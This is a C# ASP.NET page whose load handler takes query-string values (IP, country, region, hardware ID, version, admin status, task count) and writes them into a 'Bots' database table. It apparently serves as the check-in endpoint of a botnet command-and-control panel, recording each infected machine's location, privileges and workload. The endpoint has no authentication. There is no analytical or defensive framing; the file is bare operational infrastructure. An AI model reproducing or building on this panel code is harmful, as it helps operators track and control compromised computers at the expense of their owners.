using System;
using System.Data.SqlClient;

public partial class update : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string IP = Request.QueryString["IP"];
        string Country = Request.QueryString["Country"];
        string Region = Request.QueryString["Region"];
        string HWID = Request.QueryString["HWID"];
        string Version = Request.QueryString["Version"];
        string admin = Request.QueryString["admin"];
        string CTask = Request.QueryString["TaskAmount"];

        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            using (SqlCommand cmd = new SqlCommand("update Bots set IP = @IP, LastConn = @lastConn, Country = @Country, Region = @Region, Version = @Version, Admin = @Admin, CTask = @CTask where HWID = @HWID", conn))
            {
                cmd.Parameters.AddWithValue("IP", IP);
                cmd.Parameters.AddWithValue("LastConn", getDate());
                cmd.Parameters.AddWithValue("Country", Country);
                cmd.Parameters.AddWithValue("Region", Region);
                cmd.Parameters.AddWithValue("Version", Version);
                cmd.Parameters.AddWithValue("Admin", admin);
                cmd.Parameters.AddWithValue("CTask", CTask);
                cmd.Parameters.AddWithValue("HWID", HWID);

                cmd.ExecuteNonQuery();
            }
        }
    }
    public static DateTime getDate()
    {
        using (SqlConnection conn = new SqlConnection(Settings.sqlConn))
        {
            conn.Open();
            DateTime date = new DateTime();
            try
            {
                using (SqlCommand cmd = new SqlCommand("SELECT CONVERT(datetime,GETDATE())", conn))
                {
                    date = Convert.ToDateTime(cmd.ExecuteScalar());
                }
            }
            catch { }
            return date;
        }
    }
}